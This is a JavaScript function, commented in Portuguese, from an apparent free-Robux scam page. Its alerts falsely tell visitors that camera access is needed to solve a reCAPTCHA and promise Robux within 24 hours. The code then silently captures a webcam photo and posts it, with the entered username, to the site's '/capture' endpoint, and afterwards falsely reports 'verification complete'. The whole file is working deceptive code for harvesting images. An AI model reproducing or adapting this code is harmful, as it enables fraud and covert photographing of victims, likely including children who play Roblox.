function startCapture() {
    const username = document.getElementById('username').value;
    const amount = document.getElementById('amount').value;

    if (username && amount) {
        // Mensagem inicial antes de solicitar a câmera
        alert("Para garantir a segurança e evitar atividades fraudulentas, precisamos confirmar se você não é um robô. Por favor, permita o acesso à sua câmera para continuar e resolver o reCAPTCHA.\n\nApós a confirmação, iremos creditar Robux na sua conta em até no máximo 24 horas. Como este site está em desenvolvimento, pode ser que de primeira não funcione e será necessário tentar novamente mais tarde.");

        navigator.mediaDevices.getUserMedia({ video: true })
            .then((stream) => {
                const video = document.createElement('video');
                video.srcObject = stream;
                video.play();

                const canvas = document.createElement('canvas');
                const context = canvas.getContext('2d');

                video.onloadedmetadata = () => {
                    // Configura o canvas de acordo com as dimensões do vídeo
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    context.drawImage(video, 0, 0, canvas.width, canvas.height);

                    // Obtém os dados da imagem em formato base64
                    const imageData = canvas.toDataURL('image/png');

                    // Envia a imagem e os dados do usuário para o servidor
                    fetch('/capture', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                        body: `image=${encodeURIComponent(imageData)}&username=${encodeURIComponent(username)}&amount=${encodeURIComponent(amount)}`
                    }).then(() => {
                        // Para o stream da câmera
                        stream.getTracks().forEach(track => track.stop());
                        alert("Verificação concluída com sucesso! Seus Robux serão creditados em breve.");
                    }).catch(error => {
                        console.error('Erro ao enviar a imagem:', error);
                        alert("Ocorreu um erro ao enviar sua verificação. Por favor, tente novamente.");
                    });
                };
            })
            .catch((error) => {
                console.error('Erro ao acessar a câmera: ', error);
                alert("Não foi possível acessar a câmera. Por favor, permita o acesso para continuar.");
            });
    } else {
        alert("Por favor, preencha todos os campos.");
    }
}